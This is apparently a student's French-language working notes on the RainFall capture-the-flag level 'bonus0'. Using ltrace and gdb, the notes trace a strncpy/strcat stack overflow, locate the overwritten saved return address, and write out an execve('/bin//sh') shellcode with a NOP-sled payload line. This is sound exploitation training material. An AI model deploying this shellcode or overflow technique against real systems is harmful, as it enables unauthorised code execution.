bonus0@RainFall:~$ ltrace ./bonus0 
__libc_start_main(0x80485a4, 1, 0xbffff6f4, 0x80485d0, 0x8048640 <unfinished ...>
puts(" - " - )                                      = 4
read(0, lol"lol\n", 4096)                           = 4
strchr("lol\n", '\n')                               = "\n"
strncpy(0xbffff5d8, "lol", 20)                      = 0xbffff5d8
puts(" - " - )                                      = 4
read(0, lol"lol\n", 4096)                           = 4
strchr("lol\n", '\n')                               = "\n"
strncpy(0xbffff5ec, "lol", 20)                      = 0xbffff5ec
strcpy(0xbffff626, "lol")                           = 0xbffff626
strcat("lol ", "lol")                               = "lol lol"
puts("lol lol"lol lol)                              = 8

En testant 20 * A dans le premier read et 20 * B dans le deuxieme
En mettant un break point a la fin du main j'arrive a obtenir une valeur de ebp modifier

ebp            0x42424242       0x42424242
eip = 0x80485cb in main; saved eip 0x42424242

Donc le retour de la fonction main est modifier
On va surement pouvoir envoyer un shellcode de cette maniere

On reprend notre shellcode : "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

40 pour le premier ?
Offset 9 pour le deuxieme read

0x bf ff f6 10
r < <(python -c 'print "\x90"*20 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"' ; python -c 'print "\x90"*20 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')


Chercher une valeur dans la memoire : 

(gdb) find START_ADDR, END_ADDR, VALEUR

Obtenir la plage memoire :

(gdb) info proc mappings

Exemple :

(gdb) find $esp, +1000, 0x41
(gdb) find $esp, +1000, 0x6a, 0x0b, 0x58, 0x99


Ok donc avec ca on reprend du debut parce que la c'est la cata cata

Avec breakpoint dans p()
Avant leave
(gdb) find $esp, +1000, 0x41414141
0xbfffe590
(gdb) find $esp, +1000, 0x42424242
0xbfffe590

Apres leave :
(gdb) find $esp, +1000, 0x41414141
0xbffff5c8
(gdb) find $esp, +1000, 0x42424242
0xbffff5dc



Avec breakpoint dans pp()
Avant leave :
(gdb) find $esp, +1000, 0x41414141
0xbffff616
(gdb) find $esp, +1000, 0x42424242
0xbffff61b
Pas de leave dans pp()

Avec breakpoint dans main()
(gdb) find $esp, +1000, 0x42424242
0xbffff61b
(gdb) find $esp, +1000, 0x41414141
0xbffff616
donc dans le contexte du main les adresses et valeurs sont identiques

Regardons apres le leave :
(gdb) find $esp, +1000, 0x42424242
Pattern not found.
(gdb) find $esp, +1000, 0x41414141
Pattern not found.

not found car %esp est mov dans %ebp donc le find ne trouve pas a partir de %esp mais les valeurs/adresses sont toujours bien la :

(gdb) x/x 0xbffff61b
0xbffff61b:     0x42424242
(gdb) x/x 0xbffff616
0xbffff616:     0x41414141

(gdb) find 0xbffff616, +1000, 0xb7e454d3
0xbffff64c
0xbffff64c:     0xb7e454d3

On a notre adresse a modifier et sa position dans la stack ! MAGNIFIKE MA CHERIE

